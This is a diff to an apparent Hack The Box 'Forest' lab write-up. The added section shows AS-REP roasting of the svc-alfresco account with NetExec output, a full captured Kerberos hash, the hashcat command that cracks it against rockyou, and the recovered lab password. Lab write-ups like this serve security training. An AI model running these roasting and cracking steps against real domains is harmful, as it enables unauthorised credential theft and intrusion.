@@ -70,7 +70,7 @@ The domain name is `forest.htb` and The DC FQDN is `FOREST.forest.htb`.
 
 ## Kerberoasting `svc-alfresco`
 
-It seems like nmap was able to retrieve several information, like smb is accessible from an anonymous connexion.
+It seems like nmap was able to retrieve several information, maybe smb is accessible from an anonymous connexion.
 Let's confirm that with NetExect.
 
 #### NetExec
@@ -97,4 +97,27 @@ LDAP        10.129.62.73    389    FOREST           [+] htb.local\:
 LDAP        10.129.62.73    389    FOREST           [*] Total of records returned 1
 LDAP        10.129.62.73    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452
 ```
+
+## Cracking `svc-alfresco` hash
+
+I tried to crack this AS-REP hash with `Hashcat` to reavel the `svc-alfresco` password.
+
+```
+# hashcat -m 18200 asreproast.txt /opt/lists/rockyou.txt       
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:68342ef59bc941531618bb589cedd8b9$703ea2b719fbf84824611c4a36e59852274e2965faea332486dd5a722303a807aa6725bb329781f67eb5658f04b87d2ff9053d1840c47838b432d96101ca7dd50251a8c3d5c43a7835d5738ab027807d30692966ead77e33e4011fe47bb7a073a347afd640a2016bda5bdde0c0b96e5c08cd6019867d784be570a5796c7f238fd28cbd0defb930880719502dfd430d47bfe86c1a18de199a44a5163b11eddc794ef682f8d16c807c6b2bbc621a43506a4f5bbea0fc499c92f9f82b37f9e0a0689c938ac1e1cdd6a4dfff8bfe16c88965469cc3b8c89ef41655f9b8999dd3ab73885b7e083452:s3rvice
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+```
+
+The hash is cracked! I have a first domain credential:
+`svc-alfreso:s3rvice`
+
+## Enumerate ACLs with Bloodhound
+
+
+
+
 
